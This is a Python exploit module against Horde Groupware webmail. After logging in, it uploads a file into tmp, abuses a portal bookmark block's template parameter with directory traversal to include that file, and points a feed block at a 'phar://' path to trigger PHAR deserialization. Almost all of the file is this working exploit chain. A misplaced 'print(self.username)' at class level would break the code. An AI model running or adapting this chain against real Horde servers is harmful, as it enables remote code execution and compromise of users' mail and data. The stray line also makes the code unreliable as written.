import re
import requests

class Horde():
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.session()
        self.token = None
        self._login()

    print(self.username)

    def _login(self):
        url = '{}/login.php'.format(self.base_url)
        data = {
            'login_post': 1,
            'horde_user': self.username,
            'horde_pass': self.password
        }
        response = self.session.post(url, data=data)
        token_match = re.search(r'"TOKEN":"([^"]+)"', response.text)
        assert (
            len(response.history) == 1 and
            response.history[0].status_code == 302 and
            response.history[0].headers['location'] == '/services/portal/' and
            token_match
        ), 'Cannot log in'
        self.token = token_match.group(1)

    def upload_to_tmp(self, filename, data):
        url = '{}/turba/add.php'.format(self.base_url)
        files = {
            'object[photo][img][file]': (None, filename),
            'object[photo][new]': ('x', data)
        }
        response = self.session.post(url, files=files)
        assert response.status_code == 200, 'Cannot upload the file to tmp'

    def include_remote_inc_file(self, path):
        # vulnerable block (alternatively 'trean:trean_Block_Mostclicked')
        app = 'trean:trean_Block_Bookmarks'

        # add one dummy bookmark (to be sure)
        url = '{}/trean/add.php'.format(self.base_url)
        data = {
            'actionID': 'add_bookmark',
            'url': 'x'
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot add the bookmark'

        # add bookmark block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save-resume',
            'app': app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot add the bookmark block'

        # edit bookmark block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save',
            'app': app,
            'params[template]': '../../../../../../../../../../../' + path
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot edit the bookmark block'

        # evaluate the remote file
        url = '{}/services/portal/'.format(self.base_url)
        response = self.session.get(url)
        print(response.text)

        # remove the bookmark block so to not break the page
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            # XXX token not needed here
            'row': 0,
            'col': 0,
            'action': 'removeBlock'
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot reset the bookmark block'

    def trigger_phar(self, path):
        # vulnerable block (alternatively the same can be obtained by creating a
        # bookmark with the PHAR path and clocking on it)
        app = 'horde:horde_Block_Feed'

        # add syndicated feed block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save-resume',
            'app': app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot add the syndicated feed block'

        # edit syndicated feed block
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            'token': self.token,
            'row': 0,
            'col': 0,
            'action': 'save',
            'app': app,
            'params[uri]': 'phar://{}'.format(path)
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot edit the syndicated feed block'

        # load the PHAR archive
        url = '{}/services/portal/'.format(self.base_url)
        response = self.session.get(url)

        # remove the syndicated feed block so to not break the page
        url = '{}/services/portal/edit.php'.format(self.base_url)
        data = {
            # XXX token not needed here
            'row': 0,
            'col': 0,
            'action': 'removeBlock'
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, 'Cannot reset the syndicated feed block'
